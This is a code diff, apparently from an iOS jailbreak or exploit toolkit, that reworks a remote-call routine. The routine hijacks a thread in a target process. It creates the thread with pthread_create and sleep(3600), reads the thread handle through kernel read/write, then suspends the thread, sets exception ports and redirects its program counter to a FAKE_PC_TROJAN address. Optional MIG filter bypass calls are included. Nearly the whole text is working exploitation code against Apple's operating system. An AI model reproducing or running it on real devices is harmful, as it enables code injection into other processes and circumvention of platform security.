@@ -1789,9 +1789,11 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         return -1;
     }
 
-    // Use HEAP buffer for pthread_t output — stack SP-0x100 is inside
-    // pthread_create_suspended_np's own frame; function prologue clobbers it
-    // before writing *thread, so output stays at canary.
+    // pthread_create_suspended_np is a STUB on iOS 26 — returns 0 but never
+    // writes *thread or creates the thread. Use regular pthread_create with
+    // sleep(3600) as start_routine instead. The new thread blocks in sleep,
+    // giving us time to get its mach port, suspend it, set exception ports,
+    // and repark it at FAKE_PC_TROJAN via thread_set_state before resume.
     const uint64_t kCanary = 0xDEADBEEFCAFEBABEULL;
     uint64_t heapOut = do_remote_call_temp(100, "malloc", 16, 0, 0, 0, 0, 0, 0, 0);
     if (!g_RC_success || !heapOut) {
@@ -1808,21 +1810,21 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     }
     RC_DIAG("heapOut=0x%llx canary planted", (unsigned long long)heapOut);
 
-    // Fl0rk-style: start_routine = stripped shared-cache getpid (valid code page).
-    // pthread_create_suspended_np creates thread but never runs it; park at
-    // FAKE_PC_TROJAN via thread_set_state before resume.
-    uint64_t startRoutine = native_strip((uint64_t)dlsym(RTLD_DEFAULT, "getpid"));
-    if (!startRoutine) {
-        RC_DIAG("dlsym(getpid) strip failed");
+    // start_routine = sleep(3600) so the new thread blocks immediately in
+    // kernel sleep. We have ~1 hour to set up exception ports, thread_set_state
+    // to FAKE_PC_TROJAN, and thread_resume before it would naturally wake.
+    uint64_t sleepFn = native_strip((uint64_t)dlsym(RTLD_DEFAULT, "sleep"));
+    if (!sleepFn) {
+        RC_DIAG("dlsym(sleep) strip failed");
         do_remote_call_temp(100, "free", heapOut, 0, 0, 0, 0, 0, 0, 0);
         fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
         return -1;
     }
-    RC_DIAG("pthread start=getpid 0x%llx heapOut=0x%llx",
-            (unsigned long long)startRoutine, (unsigned long long)heapOut);
+    RC_DIAG("pthread_create start=sleep 0x%llx heapOut=0x%llx",
+            (unsigned long long)sleepFn, (unsigned long long)heapOut);
 
-    uint64_t createResult = do_remote_call_temp(100, "pthread_create_suspended_np",
-                                                heapOut, 0, startRoutine, 0, 0, 0, 0, 0);
+    uint64_t createResult = do_remote_call_temp(100, "pthread_create",
+                                                heapOut, 0, sleepFn, 3600, 0, 0, 0, 0);
     if (!g_RC_success || createResult != 0) {
         RC_DIAG("pthread_create failed result=%llu success=%d",
                 (unsigned long long)createResult, (int)g_RC_success);
@@ -1831,27 +1833,16 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         return -1;
     }
 
-    // Read pthread_t directly from heap via kernel R/W (authoritative).
+    // Read pthread_t from heap via kernel R/W (authoritative).
     clear_remote_shmem_cache();
     uint64_t pthreadAddr = remote_read64(heapOut);
     RC_DIAG("post-pthread heapOut=0x%llx pthreadAddr=0x%llx",
             (unsigned long long)heapOut, (unsigned long long)pthreadAddr);
-    // Also try reading via SB memcpy for cross-check
-    do_remote_call_temp(100, "memcpy", heapOut, heapOut, 8, 0, 0, 0, 0, 0);
-    clear_remote_shmem_cache();
-    uint64_t pthreadAddrSB = remote_read64(heapOut);
-    RC_DIAG("post-pthread SB-memcpy pthreadAddr=0x%llx",
-            (unsigned long long)pthreadAddrSB);
-    if (pthreadAddrSB && pthreadAddrSB != kCanary && pthreadAddr != kCanary)
-        pthreadAddr = pthreadAddrSB; // prefer SB view if both valid
     do_remote_call_temp(100, "free", heapOut, 0, 0, 0, 0, 0, 0, 0);
 
     if (!pthreadAddr || pthreadAddr == kCanary) {
-        if (pthreadAddr == kCanary) {
-            RC_DIAG("heapOut still CANARY — pthread_create_suspended_np did NOT write *thread");
-        } else {
-            RC_DIAG("pthreadAddr=0 after create");
-        }
+        RC_DIAG("pthreadAddr=0x%llx after pthread_create — create failed",
+                (unsigned long long)pthreadAddr);
         fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
         return -1;
     }
@@ -1868,6 +1859,18 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     if (!is_kaddr_valid(g_RC_callThreadAddr)) {
         RC_DIAG("synthetic thread kobject invalid port=0x%llx addr=0x%llx",
                 (unsigned long long)callThreadPort, (unsigned long long)g_RC_callThreadAddr);
+        fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
+        return -1;
+    }
+
+    // The new thread is running sleep(3600) — suspend it before modifying
+    // its thread state. thread_set_state requires the thread to be suspended.
+    uint64_t suspendRet = do_remote_call_temp(100, "thread_suspend", callThreadPort, 0, 0, 0, 0, 0, 0, 0);
+    RC_DIAG("thread_suspend synthetic port=0x%llx ret=%llu",
+            (unsigned long long)callThreadPort, (unsigned long long)suspendRet);
+    if (!g_RC_success || suspendRet != 0) {
+        RC_DIAG("thread_suspend failed ret=%llu success=%d",
+                (unsigned long long)suspendRet, (int)g_RC_success);
         fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
         return -1;
     }
@@ -1895,8 +1898,9 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     if(useMigFilterBypass)
         mig_bypass_pause();
 
-    // start_routine was real getpid — park at FAKE_PC_TROJAN before resume so
-    // the first stable wait catches 0x301 (Fl0rk/Cyanide post-create shape).
+    // Thread is now suspended in sleep(3600). Park at FAKE_PC_TROJAN via
+    // thread_set_state so when thread_resume releases it, thread starts at
+    // 0x301 → SIGBUS → caught by our exception handler (Fl0rk/Cyanide shape).
     {
         arm_thread_state64_internal park = {0};
         uint64_t stateBuf = do_remote_call_temp(100, "malloc",
